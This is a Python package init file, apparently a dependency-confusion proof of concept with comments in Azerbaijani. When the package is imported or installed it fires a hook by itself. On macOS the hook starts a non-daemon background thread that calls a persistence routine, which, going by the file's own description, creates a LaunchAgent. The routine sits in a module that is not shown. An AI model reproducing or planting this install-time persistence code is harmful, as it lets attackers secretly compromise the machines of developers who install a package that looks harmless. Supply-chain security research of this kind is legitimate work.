"""
PEP 517 Dependency Confusion PoC with macOS Persistence
Bu paket installation zamanı avtomatik olaraq macOS LaunchAgent yaradır
"""
__version__ = "0.1.2"

import sys
import os
import platform
import threading
import time

def trigger_hook():
    """
    Yalnız macOS-də işləyir və background thread-də persistence qurur
    """
    log_file = '/tmp/hooktest_init.log'
    
    try:
        with open(log_file, 'a') as f:
            f.write(f"=== HOOK TRIGGERED ===\n")
            f.write(f"Platform: {platform.system()}\n")
            f.write(f"Machine: {platform.machine()}\n")
        
        # Yalnız macOS-də davam et
        if platform.system() != 'Darwin':
            with open(log_file, 'a') as f:
                f.write("Not macOS - skipping persistence setup\n")
            return
        
        with open(log_file, 'a') as f:
            f.write("macOS detected - proceeding with persistence setup\n")
        
        # main.py-ni import et
        from .main import setup_macos_persistence
        
        with open(log_file, 'a') as f:
            f.write("Main module imported successfully\n")
        
        # Background thread-də persistence qur
        # daemon=False - thread əsas proses bitdikdən sonra da davam edəcək
        setup_thread = threading.Thread(
            target=setup_macos_persistence, 
            daemon=False,
            name="PersistenceSetup"
        )
        setup_thread.start()
        
        with open(log_file, 'a') as f:
            f.write("Persistence setup thread started\n")
        
        # Thread-in işləməyə başlaması üçün gözlə
        time.sleep(2)
        
        with open(log_file, 'a') as f:
            f.write("Init hook completed - pip install can continue\n")
        
    except Exception as e:
        try:
            with open(log_file, 'a') as f:
                f.write(f"ERROR in trigger_hook: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")
        except:
            pass

# Auto-trigger on import
trigger_hook()